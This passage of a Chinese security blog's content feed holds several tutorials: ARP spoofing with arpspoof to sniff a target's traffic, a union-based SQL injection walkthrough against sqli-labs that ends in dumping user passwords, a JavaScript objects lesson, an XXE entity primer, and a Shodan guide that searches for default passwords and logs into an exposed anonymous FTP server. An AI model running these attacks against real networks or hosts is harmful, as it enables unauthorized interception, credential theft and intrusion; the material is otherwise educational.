<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击也有很多种<br>通过欺骗对方叫流量转发给我然后我在转发出去<br><strong>查看网络里的人</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174024830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动路由转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof   -t 目标ip  -r  网关地址</span><br></pre></td></tr></table></figure>
<p><strong>可以加上-i指定网卡</strong></p>
<p>进行arp欺骗<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174659711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>urlsnarf -i wlan0抓取目标访问的网站<br>还有很多<br>成功获取到密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416182046801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 网易web安全渗透  union联合查询注入</title>
    <url>/2020/08/10/2.%20%E7%BD%91%E6%98%93union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="1-sql-union操作符"><a href="#1-sql-union操作符" class="headerlink" title="1. sql union操作符"></a>1. sql union操作符</h2><p>union操作符是用于，并合两个或者多个select语句的结果<br><strong>注意,union内部的 select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时,每条 select语句中的列的顺序必须相同</strong><br>默认情况,union操作符选取不同的值。如果允许重复的值,请使用 union ALL.。</p>
<h2 id="2-注入应用场景"><a href="#2-注入应用场景" class="headerlink" title="2. 注入应用场景"></a>2. 注入应用场景</h2><ol>
<li>只有最后一个 SELECT子句允许有 ORDER BY;</li>
<li>只有最后一个 SELECT子句允许有uMT;</li>
<li>只要UNON连接的几个查询的字段数一样且列的数据类型转换没有问题,就可以查询出结果</li>
<li>注入点页面有回显;</li>
</ol>
<h2 id="sql注入流程图-，下面就按照上面的流程进行注入"><a href="#sql注入流程图-，下面就按照上面的流程进行注入" class="headerlink" title="sql注入流程图 ，下面就按照上面的流程进行注入"></a>sql注入流程图 ，下面就按照上面的流程进行注入</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730171110963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="1-ORDER-BY-判断列数"><a href="#1-ORDER-BY-判断列数" class="headerlink" title="1.ORDER BY 判断列数"></a>1.ORDER BY 判断列数</h3><p>ORDER BY 是用来排序的<br>        进行排序这个ORDER BY 关键字经常用于sql注入的时候，根据错误，判断有几个表<br>        列下面有6个表<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523185903455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>判断有几个表</strong><br>        ORDER BY 7就报错了，应为他只有6个表<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190036955.png" alt="在这里插入图片描述"><br>        ORDER BY 6就对了<br>        <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190259569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70"><br><strong>用sqli-labs进行测试</strong><br>输入4发现就报错了,那这样就判断出来，字段是有3个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173055957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="2-观察页面返回，选择可以显示数据的位置，进行下一步的注入"><a href="#2-观察页面返回，选择可以显示数据的位置，进行下一步的注入" class="headerlink" title="2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入"></a>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入</h3><p>我们输入<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union%20 select 1,2,3 --+</code><br>判断注入的位置上2和3</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173813841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行的sql语句结果就是这个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173958524.png" alt="在这里插入图片描述"></p>
<h3 id="3读取库的信息"><a href="#3读取库的信息" class="headerlink" title="3读取库的信息"></a>3读取库的信息</h3><p>输入的URL<code>http://192.168.0.104/Less-2/ ?id= -1 union  select 1,user(),3 --+</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730174451652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="4-读取数据"><a href="#4-读取数据" class="headerlink" title="4.读取数据"></a>4.读取数据</h3><h4 id="1-查看数据库名"><a href="#1-查看数据库名" class="headerlink" title="1.查看数据库名"></a>1.查看数据库名</h4><p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 0,1),3 --+</code><br><strong>上面的URL介绍</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>用于查看行数，应为他只能显示一个，所以输出也只能一个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181715462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看其他下一个数据库</p>
<p>URL<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 1,1),3 --+</code><br>结果<br>只要修改<code>LIMIT 0,1</code>改成1就可以了<br>可以看到显示出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181935785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>1.2读取全部的库</strong><br>上面输出一个不太好<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br>用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730175714834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="2-读取查表"><a href="#2-读取查表" class="headerlink" title="2.读取查表"></a>2.读取查表</h4><p>通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了</p>
<p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 --+</code></p>
<p>URL介绍</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>叫表给显示出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730184527355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="3-查询列"><a href="#3-查询列" class="headerlink" title="3.查询列"></a>3.查询列</h4><p>通过上面的查询查询出来了库和表<br>通过上面的表查询列<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 --+</code><br>URL介绍</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>查看出来列了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730190143774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="4-读取数据-1"><a href="#4-读取数据-1" class="headerlink" title="4.读取数据"></a>4.读取数据</h4><p>通过上面的注入，知道了库，表，列<br>知道了全部就可以查询数据了<br>用这个<code>select 列名 from 库名.表名</code><br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(password) from security.users),3 --+</code><br>结果<br>通过注入叫数据给输出出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730191432156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2.JavaScript面向对象的基本使用</title>
    <url>/2020/11/25/2.JavaScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="创建一个对象"><a href="#创建一个对象" class="headerlink" title="创建一个对象"></a>创建一个对象</h2><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>();  </span><br></pre></td></tr></table></figure>
<h2 id="添加对象里面的属性值"><a href="#添加对象里面的属性值" class="headerlink" title="添加对象里面的属性值"></a>添加对象里面的属性值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>(); </span><br><span class="line"><span class="comment">//添加对象里面的属性值 </span></span><br><span class="line">a.name=<span class="string">&#x27;abc&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="读取对象"><a href="#读取对象" class="headerlink" title="读取对象"></a>读取对象</h2><h3 id="下面这个是整个读取"><a href="#下面这个是整个读取" class="headerlink" title="下面这个是整个读取"></a>下面这个是整个读取</h3><p>事例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//创建一个对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>();  </span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//添加对象里面的属性值</span></span></span><br><span class="line"><span class="javascript">    a.name=<span class="string">&#x27;abc&#x27;</span>;</span></span><br><span class="line">    a.gender=123456;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125103002.png"></p>
<h3 id="读取指定的"><a href="#读取指定的" class="headerlink" title="读取指定的"></a>读取指定的</h3><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//创建一个对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>();  </span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//添加对象里面的属性值</span></span></span><br><span class="line"><span class="javascript">    a.name=<span class="string">&#x27;abc&#x27;</span>;</span></span><br><span class="line">    a.gender=123456;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a.gender);</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125103253.png"></p>
<h2 id="删除对象属性"><a href="#删除对象属性" class="headerlink" title="删除对象属性"></a>删除对象属性</h2><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span>  对象名.属性名;</span><br></pre></td></tr></table></figure>
<h2 id="特殊的属性名"><a href="#特殊的属性名" class="headerlink" title="特殊的属性名"></a>特殊的属性名</h2><h3 id="定义特殊的属性名"><a href="#定义特殊的属性名" class="headerlink" title="定义特殊的属性名"></a>定义特殊的属性名</h3><p>对象可以用数字属性名,要用<code>[]</code>来定义<br>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>(); </span><br><span class="line"><span class="comment">//定义特殊的属性</span></span><br><span class="line">a[<span class="string">&#x27;123&#x27;</span>]=<span class="number">123</span>;</span><br><span class="line"><span class="comment">//输出特殊的属性</span></span><br><span class="line"><span class="built_in">console</span>.log(a[<span class="string">&#x27;123&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//创建一个对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="keyword">new</span>  <span class="built_in">Object</span>(); </span></span><br><span class="line"><span class="javascript">    <span class="comment">//定义特殊的属性</span></span></span><br><span class="line"><span class="javascript">    a[<span class="string">&#x27;123&#x27;</span>]=<span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//输出特殊的属性</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a[<span class="string">&#x27;123&#x27;</span>]); </span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125104222.png"></p>
]]></content>
      <categories>
        <category>编程</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>2.XXE漏洞原理和实战之DTD的实体</title>
    <url>/2020/10/16/2.XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E4%B9%8BDTD%E7%9A%84%E5%AE%9E%E4%BD%93/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>学习</p>
<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明</p>
<p>通俗的来说他就是一个变量<br>比如<br>下面的<code>a</code>就是<code>&lt;h1&gt;aaaa&lt;/h1&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&lt;h1&gt;aaaa&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>


<p>来说<code>实体名称</code>就是变量<code>实体的值</code>就是赋的值</p>
<h2 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h2><h3 id="普通实体声明"><a href="#普通实体声明" class="headerlink" title="普通实体声明"></a>普通实体声明</h3><p><strong>普通实体通俗来说</strong><br><strong>内部实体</strong><br>来说<code>实体名称</code>就是常量<code>实体的值</code>就是赋的值</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>外部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="参数实体声明"><a href="#参数实体声明" class="headerlink" title="参数实体声明"></a>参数实体声明</h3><p>下面的通俗来说<code>实体名称</code>就是变量<code>实体的值</code>就是赋的值<br>他们<code>%</code>后面是有一个空格都</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>外部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY %  实体名称 <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="普通实体"><a href="#普通实体" class="headerlink" title="普通实体"></a>普通实体</h2><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>自定义实体定义</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就和上面那个实体声明里面就是那样的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>*)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">email</span> <span class="meta-string">&quot;ccccc&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>bbbbb<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span><span class="symbol">&amp;email;</span><span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201015095749.png"></p>
<h3 id="预定义实体"><a href="#预定义实体" class="headerlink" title="预定义实体"></a>预定义实体</h3><p>下面这个就是已经定义好的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;	&lt;</span><br><span class="line">&gt;	&gt;</span><br><span class="line">&amp;	&amp;</span><br><span class="line">&quot;	&quot;</span><br><span class="line">&amp;apos;	&#39;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201015141800.png"><br>咧：<br>代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;lt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;amp;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;quot;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;apos;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201015142134.png"></p>
<h2 id="猜数实体"><a href="#猜数实体" class="headerlink" title="猜数实体"></a>猜数实体</h2><p>他在DTD里面去用<br>他的声明</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
        <category>XXE漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2.信息收集之Shodan搜索引擎</title>
    <url>/2020/10/29/2.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BShodan%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>Shodan地址</strong><br><a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<h2 id="Shodan介绍"><a href="#Shodan介绍" class="headerlink" title="Shodan介绍"></a>Shodan介绍</h2><p><strong>Shodan才是互联网最强大的搜索引擎，他会爬取和互联网相关的所有设备比如，web服务器，打印机，防火墙，摄像头等等，他会日夜不停的爬取</strong></p>
<h2 id="搜索协议"><a href="#搜索协议" class="headerlink" title="搜索协议"></a>搜索协议</h2><p>比如http协议的<br>咧输入<code>http</code><br>下面他之显示带有http协议的服务器<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028103709.png"><br><strong>事例：</strong><br>输入<code>ssh</code><br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028112340.png"></p>
<h2 id="搜索带有关键字的"><a href="#搜索带有关键字的" class="headerlink" title="搜索带有关键字的"></a>搜索带有关键字的</h2><p><strong>事例：</strong><br>搜索里面带default(默认)  password(密码)的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh default password</span><br></pre></td></tr></table></figure>
<p>这个结果是只是在输出内容里面有<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028113641.png"><br><strong>2事例：</strong><br>搜索服务是FTP的里面带anon(匿名)  successful(登录成功的字)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FTP anon successful</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028114336.png"><br>打开下面那一个直接登录ftp服务器<br>结果进去了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028114500.png"></p>
<h2 id="country搜索指定的国家"><a href="#country搜索指定的国家" class="headerlink" title="country搜索指定的国家"></a>country搜索指定的国家</h2><p><strong>格式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">country:&quot;国家名&quot;   &#x2F;&#x2F;注意国家名是两个字符的</span><br></pre></td></tr></table></figure>
<p>在搜索引擎搜索<code>两位字符国家</code>有出来了<br>下面这个连接是我推荐的<br><a href="http://www.weiwozhi.com/read.php?id=26">http://www.weiwozhi.com/read.php?id=26</a></p>
<p><strong>事例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">country:&quot;CN&quot;   &#x2F;&#x2F;CN是中国</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201028110143.png"></p>
<h2 id="city指定要搜索的城市"><a href="#city指定要搜索的城市" class="headerlink" title="city指定要搜索的城市"></a>city指定要搜索的城市</h2><p>格式</p>
